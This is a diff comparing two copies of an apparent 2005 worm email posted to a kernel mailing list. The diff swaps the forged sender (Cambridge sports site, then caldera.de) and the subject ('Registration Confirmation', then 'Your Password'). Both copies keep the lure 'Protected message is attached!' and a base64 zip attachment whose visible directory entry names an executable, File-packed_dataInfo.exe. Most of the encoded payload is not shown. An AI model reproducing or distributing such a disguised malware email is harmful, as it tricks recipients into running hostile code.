@@ -1,26 +1,26 @@
-From: webmaster@sport.cam.ac.uk
-Subject: Registration Confirmation
-Date: Fri, 09 Dec 2005 08:52:12 UTC
-Message-ID: <8b84db353511.1d5a1@sport.cam.ac.uk>
+From: hostmaster@caldera.de
+Subject: Your Password
+Date: Fri, 09 Dec 2005 08:58:55 GMT
+Message-ID: <cc2cd9.6b677ec745895@caldera.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====ac8d9103fae87ae1c86"
+Content-Type: multipart/mixed; boundary="=423edebc6df.aeb7f8c5d"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: listening6053@oss.sgi.com
+To: ralf@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====ac8d9103fae87ae1c86
+--=423edebc6df.aeb7f8c5d
 
 Protected message is attached!
 
 
-***** Go to: http://www.sport.cam.ac.uk
-***** Email: postman@sport.cam.ac.uk
---====ac8d9103fae87ae1c86
+***** Go to: http://www.caldera.de
+***** Email: postman@caldera.de
+--=423edebc6df.aeb7f8c5d
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====ac8d9103fae87ae1c86--
+--=423edebc6df.aeb7f8c5d--
